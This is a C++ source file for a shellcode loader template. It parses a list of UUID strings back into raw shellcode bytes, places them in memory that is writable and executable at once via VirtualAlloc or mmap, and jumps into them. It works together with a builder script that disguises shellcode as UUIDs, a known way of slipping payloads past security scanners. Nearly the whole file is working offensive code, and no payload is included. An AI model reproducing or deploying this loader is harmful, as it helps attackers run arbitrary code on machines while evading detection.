/*
 * uuid_loader.cpp - UUID-string shellcode loader template
 * =======================================================
 * The builder maps shellcode onto a list of UUID strings (bytes_le /
 * GUID layout, 16 bytes per UUID, zero-padded). This loader parses the
 * strings back into bytes and executes the (padded, then truncated to
 * kOriginalLen) shellcode. No key material is involved.
 *
 * Regenerate the payload include with the builder:
 *   shellcrypt.py -i shellcode.bin -m uuid --verify --meta params.json -f txt
 *   (then regenerate payload_inc.h via tools/gen_inc.py)
 *
 * Compile: g++ -O2 -Wall -o uuid_loader uuid_loader.cpp
 *
 * GUID byte layout (matches Python uuid.UUID(bytes_le=...).bytes_le):
 *   aabbccdd-eeff-0011-2233-445566778899  ->  dd cc bb aa ff ee 11 00 22 33 ...
 */
#include <cstdint>
#include <cstdio>
#include <cstring>

#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#endif

#include "payload_inc.h" /* kUuids[], kUuidCount, kOriginalLen */

/* Parse one UUID string into its 16 bytes_le. Returns 0 on success. */
static int parse_uuid(const char *u, uint8_t out[16]) {
    unsigned b[16];
    if (sscanf(u, "%2x%2x%2x%2x-%2x%2x-%2x%2x-%2x%2x-%2x%2x%2x%2x%2x%2x",
               &b[0], &b[1], &b[2], &b[3], &b[4], &b[5], &b[6], &b[7],
               &b[8], &b[9], &b[10], &b[11], &b[12], &b[13], &b[14], &b[15]) != 16)
        return -1;
    static const int le[16] = {3, 2, 1, 0, 5, 4, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15};
    for (int i = 0; i < 16; i++) out[i] = (uint8_t)b[le[i]];
    return 0;
}

static int uuid_decrypt(uint8_t *plain) {
    for (unsigned i = 0; i < kUuidCount; i++)
        if (parse_uuid(kUuids[i], plain + 16 * i) != 0) return -1;
    return 0;
}

static int run_payload(const uint8_t *p, size_t n) {
#ifdef _WIN32
    void *mem = VirtualAlloc(NULL, n, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) { printf("[-] VirtualAlloc failed\n"); return -1; }
#else
    void *mem = mmap(NULL, n, PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) { printf("[-] mmap failed\n"); return -1; }
#endif
    memcpy(mem, p, n);
    int (*fn)() = (int (*)())mem;
    int r = fn();
#ifdef _WIN32
    VirtualFree(mem, 0, MEM_RELEASE);
#else
    munmap(mem, n);
#endif
    return r;
}

int main(void) {
    static uint8_t plain[4096];
    if (uuid_decrypt(plain) != 0) { printf("[-] UUID parse failed\n"); return 1; }
    printf("[+] UUID decoded %d strings -> %d bytes (orig %d)\n",
           kUuidCount, kUuidCount * 16, kOriginalLen);
    int r = run_payload(plain, kOriginalLen);
    printf("[+] payload returned %d\n", r);
    return 0;
}
